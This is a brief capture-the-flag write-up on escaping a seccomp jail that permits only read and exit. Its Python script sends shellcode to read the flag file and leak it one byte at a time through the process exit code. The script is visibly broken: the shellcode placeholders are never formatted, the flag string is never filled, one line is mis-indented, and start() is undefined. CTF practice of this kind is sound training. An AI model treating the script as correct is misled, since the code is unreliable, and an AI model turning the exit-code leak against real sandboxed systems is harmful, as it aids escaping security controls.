# Sandboxing - Level 10
In this level we are asked to escape a seccomp jail with the following syscalls `read` and `exit`, this is quite tricky because we can't use the `write` syscall to read the flag, instead we're gonna have to call `exit` with each byte of our flag therefore leaking it, we are going to write a python script which will capture every exit value our program is ending with, automating the leaking process.

Script used to solve the challenge.
```py
read_addr = 0x1337080
exit_bytes_addr = 0x1337080

flag = ""

while True:
  io = start()
  shellcode = """
    mov rax, 0
    mov rdi, 3
    mov rsi, {read_addr}
    mov rdx, 0x1000
    syscall
    mov rax, 60
    mov dil, byte ptr [{exit_bytes_addr}]
    syscall
  """
  io.write(asm(shellcode))
  poll = io.poll()
  if chr(poll) == "}":
    break
   exit_bytes_addr += 1
   
print(f"flag : {flag}")
io.interactive()
```
